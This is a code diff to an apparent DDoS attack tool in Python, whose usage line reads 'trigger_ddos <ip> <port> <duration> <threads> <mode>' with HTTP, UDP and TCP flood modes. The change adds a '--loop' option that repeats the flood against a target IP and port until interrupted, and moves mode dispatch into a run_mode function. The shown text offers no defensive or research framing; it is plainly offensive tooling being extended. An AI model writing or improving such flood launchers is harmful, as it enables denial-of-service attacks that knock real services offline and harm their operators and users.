@@ -81,19 +81,32 @@ def run_threads(attack_func, threads, duration, label):
         t.daemon = True
         t.start()
     time.sleep(duration)
-    print(f"[+] {label} completed.")
+    print(f"[+] {label} completed.\n")
 
 def parse_trigger(args):
-    if len(args) != 6:
-        print("Usage: trigger_ddos <ip> <port> <duration> <threads> <mode>")
+    if len(args) < 6:
+        print("Usage: trigger_ddos <ip> <port> <duration> <threads> <mode> [--loop]")
         print("Modes: http | udp | tcp")
         sys.exit(1)
 
-    _, ip, port, duration, threads, mode = args
+    _, ip, port, duration, threads, mode, *flags = args
     port = int(port)
     duration = int(duration)
     threads = int(threads)
+    loop = "--loop" in flags
 
+    print(f"[✓] Mode: {mode.upper()} | IP: {ip} | Port: {port} | Threads: {threads} | Duration: {duration}s")
+    if loop:
+        print("[∞] Continuous mode enabled. Press Ctrl+C to stop.\n")
+        try:
+            while True:
+                run_mode(mode, ip, port, duration, threads)
+        except KeyboardInterrupt:
+            print("\n[✘] Continuous attack stopped by user.")
+    else:
+        run_mode(mode, ip, port, duration, threads)
+
+def run_mode(mode, ip, port, duration, threads):
     if mode == "http":
         http_flood(ip, port, duration, threads)
     elif mode == "udp":
